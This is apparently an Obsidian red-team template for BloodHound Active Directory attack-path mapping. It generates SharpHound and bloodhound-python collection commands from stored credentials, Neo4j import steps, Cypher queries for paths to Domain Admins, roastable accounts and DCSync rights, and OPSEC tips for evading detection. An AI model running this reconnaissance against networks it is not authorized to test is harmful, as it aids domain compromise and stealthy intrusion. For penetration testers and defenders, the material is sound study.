---
# Attack-specific fields
bh_collection_method: all
bh_neo4j_url: bolt://localhost:7687
bh_neo4j_user: neo4j
bh_neo4j_password: neo4j
bh_output_dir: bloodhound_output
shortest_path_target:
query_custom:
notes:
---

# BloodHound & Attack Path Automation

> [!abstract] Attack Summary
> **BloodHound** maps Active Directory relationships and privilege paths using graph theory. It collects data (users, groups, computers, ACLs, sessions, trusts) via **SharpHound** (Windows) or **bloodhound-python** (Linux), ingests it into Neo4j, and reveals attack paths from owned nodes to Domain Admin. Custom Cypher queries enable targeted analysis.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const methods = ["all","DCOnly","Default","Session","LoggedOn","Trusts","ACL","Container","Group","LocalAdmin","RDP","DCOM","PSRemote","ObjectProps"];
const methodOptions = methods.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["Collection Method",   `\`INPUT[inlineSelect(defaultValue(${p.bh_collection_method ?? 'all'}),${methodOptions}):bh_collection_method]\``],
  ["Output Directory",    `\`INPUT[text(defaultValue("${p.bh_output_dir ?? 'bloodhound_output'}")):bh_output_dir]\``],
  ["Shortest Path Target",`\`INPUT[text:shortest_path_target]\``],
]);
```

---

## Step 1 — Collect Data

**Windows — SharpHound (in-memory via Beacon)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const method   = p?.bh_collection_method ?? "all";
const outDir   = p?.bh_output_dir ?? ".";
dv.paragraph("```bash\n# Full collection (recommended)\nexecute-assembly C:\\Tools\\SharpHound\\SharpHound.exe -c " + method + " --domain " + domain + " --ldapusername " + (b?.username ?? "USER") + " --ldappassword " + (b?.password ?? "PASS") + " --zipfilename bh_output.zip --outputdirectory " + outDir + "\n\n# Stealth: DCOnly (no host enumeration, much less noise)\nexecute-assembly C:\\Tools\\SharpHound\\SharpHound.exe -c DCOnly --domain " + domain + " --outputdirectory " + outDir + "\n\n# With domain controller specified\nexecute-assembly C:\\Tools\\SharpHound\\SharpHound.exe -c " + method + " --domain " + domain + " --domaincontroller " + dc_ip + " --outputdirectory " + outDir + "\n\n# Download results\ndownload " + outDir + "\\bh_output.zip\n```");
```

**Linux — bloodhound-python (remote, no agent needed)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const method   = p?.bh_collection_method ?? "all";
dv.paragraph("```bash\n# Full collection\nbloodhound-python -u '" + username + "' -p '" + password + "' -d " + domain + " -ns " + dc_ip + " -c " + method + " --zip\n\n# With Kerberos\nexport KRB5CCNAME=ticket.ccache\nbloodhound-python -u '" + username + "' -k -no-pass -d " + domain + " -ns " + dc_ip + " -c " + method + "\n\n# DCOnly (stealthy)\nbloodhound-python -u '" + username + "' -p '" + password + "' -d " + domain + " -ns " + dc_ip + " -c DCOnly\n\n# Output: *.json files — import into BloodHound GUI\n```");
```

---

## Step 2 — Import Data into BloodHound

```dataviewjs
dv.paragraph("```bash\n# Start Neo4j\nneo4j start  # or: sudo neo4j console\n\n# Start BloodHound GUI and login to: http://localhost:7474\n# Default creds: neo4j / neo4j (change on first login)\n\n# Import: BloodHound GUI → Upload Data → Select zip/json files\n# Or via community edition (BloodHound CE):\ndocker run -d -p 8080:8080 -p 8088:8088 specterops/bloodhound-ce:latest\n```");
```

---

## Step 3 — Mark Owned Nodes

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const username = b?.username ?? "USER";
const domain   = b?.domain   ?? "DOMAIN";
dv.paragraph("```bash\n# In BloodHound GUI:\n# 1. Search for your owned user: " + username.toUpperCase() + "@" + domain.toUpperCase() + "\n# 2. Right-click → Mark as Owned\n# 3. Repeat for all owned computers\n\n# Alternatively, use the BH community API to mark owned nodes:\ncurl -X PATCH 'http://localhost:8080/api/v2/users/USER_ID' \\\n  -H 'Authorization: Bearer TOKEN' \\\n  -d '{\"owned\": true}'\n```");
```

---

## Step 4 — Key Queries (GUI)

> [!tip] Use BloodHound's pre-built queries first, then run custom Cypher for targeted analysis.

**Pre-built Queries to Run First:**
- Find Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Find Computers where Domain Users are Local Admin
- Find AS-REP Roastable Users
- Find Kerberoastable Users with most privileges
- Find Users with Foreign Domain Group Membership

---

## Step 5 — Custom Cypher Queries

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain?.toUpperCase() ?? "DOMAIN.LOCAL";
const target   = p?.shortest_path_target || "Domain Admins@" + domain;
dv.paragraph("```cypher\n// Shortest paths from owned nodes to DA\nMATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:\"DOMAIN ADMINS@" + domain + "\"}))\nRETURN p\n\n// All paths from owned to DA (slower but more complete)\nMATCH p=allShortestPaths((u:User {owned:true})-[*1..10]->(g:Group {name:\"DOMAIN ADMINS@" + domain + "\"}))\nRETURN p\n\n// Find kerberoastable users with DA path\nMATCH (u:User {hasspn:true}), (g:Group {name:'DOMAIN ADMINS@" + domain + "'}),\np=shortestPath((u)-[*1..]->(g))\nRETURN u.name, length(p) ORDER BY length(p)\n\n// Computers where owned user is local admin\nMATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)\nRETURN u.name, c.name\n\n// Find GenericAll/GenericWrite paths\nMATCH p=(u:User {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner*1..5]->(t)\nRETURN p LIMIT 25\n\n// Find users with DCSync rights\nMATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain)\nRETURN n.name, labels(n)\n\n// Find paths via LAPS read\nMATCH p=(u:User {owned:true})-[:ReadLAPSPassword]->(c:Computer)\nRETURN p\n\n// Find unconstrained delegation computers (non-DC)\nMATCH (c:Computer {unconstraineddelegation:true, domain:'" + domain + "'}) WHERE NOT c.name CONTAINS 'DC'\nRETURN c.name\n\n// Find AS-REP roastable users\nMATCH (u:User {dontreqpreauth:true, enabled:true})\nRETURN u.name ORDER BY u.name\n\n// Custom target: paths to specific node\nMATCH p=shortestPath((u:User {owned:true})-[*1..]->(t {name:\"" + target + "\"}))\nRETURN p\n```");
```

Custom query to run: `INPUT[text:query_custom]`

---

## Step 6 — BHCETooling / Neo4j Direct Queries

```dataviewjs
const p = dv.current();
const neo4jUrl = p?.bh_neo4j_url || "bolt://localhost:7687";
const neo4jUser= p?.bh_neo4j_user || "neo4j";
const neo4jPass= p?.bh_neo4j_password || "neo4j";
dv.paragraph("```bash\n# Query Neo4j directly via cypher-shell\ncypher-shell -a " + neo4jUrl + " -u " + neo4jUser + " -p " + neo4jPass + " \\\n  'MATCH (n:User {owned:true}) RETURN n.name'\n\n# Export all DA paths to CSV\ncypher-shell -a " + neo4jUrl + " -u " + neo4jUser + " -p " + neo4jPass + " \\\n  'MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})) RETURN p' \\\n  --format plain > paths.csv\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - SharpHound with `All` collection makes **LDAP queries** that generate significant traffic and **Event 4662**.
> - `Session` collection connects to each workstation via SMB — generates **Event 4624** (network logon) on every host.
> - **DCOnly** is much stealthier — no direct host contact.
> - BloodHound CE collection via API is detectable via LDAP volume analysis.
> - Consider running off-hours or with reduced collection scope.

---

## Notes & Results

`INPUT[textarea:notes]`
